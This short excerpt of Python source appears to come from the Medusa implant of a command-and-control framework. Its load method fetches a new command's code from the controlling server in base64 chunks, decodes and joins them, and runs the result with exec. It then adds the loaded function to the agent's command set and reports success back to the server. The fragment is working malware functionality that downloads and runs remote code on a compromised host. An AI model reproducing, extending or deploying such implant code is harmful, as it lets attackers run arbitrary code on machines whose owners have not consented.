    def load(self, task_id, file_id, command):
        total_chunks = 1
        chunk_num = 0
        cmd_code = ""
        while (chunk_num < total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."
            data = { "action": "post_response", "responses": [
                    { "upload": { "chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num+1 }, "task_id": task_id }
                ]}
            response = self.postMessageAndRetrieveResponse(data)
            chunk = response["responses"][0]
            chunk_num+=1
            total_chunks = chunk["total_chunks"]
            cmd_code += base64.b64decode(chunk["chunk_data"]).decode()

        if cmd_code:
            exec(cmd_code.replace("\n    ","\n")[4:])
            setattr(medusa, command, eval(command))
            cmd_list = [{"action": "add", "cmd": command}]
            responses = [{ "task_id": task_id, "user_output": "Loaded command: {}".format(command), "commands": cmd_list, "completed": True }]
            message = { "action": "post_response", "responses": responses }
            response_data = self.postMessageAndRetrieveResponse(message)
        else: return "Failed to upload '{}' command".format(command)
